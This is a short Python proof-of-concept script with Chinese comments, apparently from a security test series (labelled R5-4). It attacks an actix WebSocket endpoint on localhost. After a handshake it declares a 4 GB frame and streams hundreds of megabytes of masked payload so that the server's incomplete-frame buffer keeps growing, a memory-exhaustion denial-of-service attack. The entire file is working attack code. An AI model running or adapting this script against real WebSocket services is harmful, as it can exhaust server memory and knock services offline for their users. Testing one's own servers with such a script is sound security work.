#!/usr/bin/env python3
"""R5-4: actix ws 未完成帧累积攻击 — 声明大帧长 + 持续流式喂数据, 观察 buf 累积"""
import socket, struct, sys, time

def handshake(sock):
    key = "dGhlIHNhbXBsZSBub25jZQ=="
    req = (f"GET /ws HTTP/1.1\r\nHost: 127.0.0.1:18084\r\n"
           f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
           f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n")
    sock.sendall(req.encode())
    resp = sock.recv(4096)
    assert b"101" in resp, resp[:200]

def frame_header(declared_len):
    hdr = bytearray([0x82])  # FIN + binary
    hdr.append(0x80 | 127)   # masked + 64-bit length
    hdr += struct.pack(">Q", declared_len)
    hdr += b"\x01\x02\x03\x04"
    return bytes(hdr)

def main():
    declared = int(sys.argv[1]) if len(sys.argv) > 1 else 4 << 30    # 4GB
    stream_mb = int(sys.argv[2]) if len(sys.argv) > 2 else 200       # 流式发送量
    s = socket.create_connection(("127.0.0.1", 18084), timeout=5)
    handshake(s)
    time.sleep(0.5)
    s.sendall(frame_header(declared))
    print(f"[+] declared {declared/2**30:.0f}GB frame, streaming {stream_mb}MB payload data...")
    # 掩码数据流式发送 (每个 byte ^= 0x01)
    chunk = bytes([0x01] * 65536)
    sent = 0
    for i in range(stream_mb * 16):
        s.sendall(chunk)
        sent += len(chunk)
        if i % 256 == 0:
            time.sleep(0.02)
    print(f"[+] streamed {sent/1024/1024:.0f}MB, connection still open")
    s.settimeout(3)
    try:
        data = s.recv(1024)
        print(f"[+] response: {data[:80]!r}")
    except socket.timeout:
        print("[+] no response (frame still incomplete)")
    except ConnectionResetError:
        print("[+] CONNECTION RESET")
    time.sleep(2)

if __name__ == "__main__":
    main()
